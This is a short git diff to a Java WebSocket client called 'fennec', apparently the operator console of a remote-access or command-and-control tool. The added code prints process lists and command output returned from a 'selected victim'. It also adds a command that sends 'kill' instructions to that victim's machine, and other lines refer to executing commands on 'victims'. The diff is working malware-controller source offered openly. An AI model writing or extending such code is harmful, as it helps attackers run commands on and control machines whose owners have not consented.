@@ -2,6 +2,8 @@ package com.heshanthenura.fennec;
 
 // new branch
 
+import java.io.DataInput;
+import java.io.IOException;
 import java.net.URI;
 import java.util.ArrayList;
 import java.util.List;
@@ -56,6 +58,21 @@ public class Client extends WebSocketClient {
                 }else if(jsonNode.get("info_name").asText().equals("my_id")){
                     myID=jsonNode.get("data").asText();
                     System.out.println("My ID is: "+myID);
+                }
+            } else if (jsonNode.get("type").asText().equals("exec")) {
+                if (jsonNode.get("state").asText().equals("res")) {
+                    if (jsonNode.get("command").asText().equals("tasklist")) {
+                        String dataString = jsonNode.get("data").asText(); // Get the stringified array
+                        // Convert the string back to an array
+                        String[] taskList = objectMapper.readValue(dataString, String[].class);
+
+                        System.out.println("Tasklist:");
+                        for (String task : taskList) {
+                            System.out.println(task);
+                        }
+                    } else {
+                        System.out.println(jsonNode.get("data").asText());
+                    }
                 }
             }
 
@@ -133,6 +150,9 @@ public class Client extends WebSocketClient {
                 } else if(message.startsWith("exec ")){
                     if (getSelectedVictim()==null){
                         System.out.println("No victims selected to execute commands");
+                    }else if(splitMsg[1].equals("kill")){
+                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]));
+
                     }else{
                         client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]));
                     }
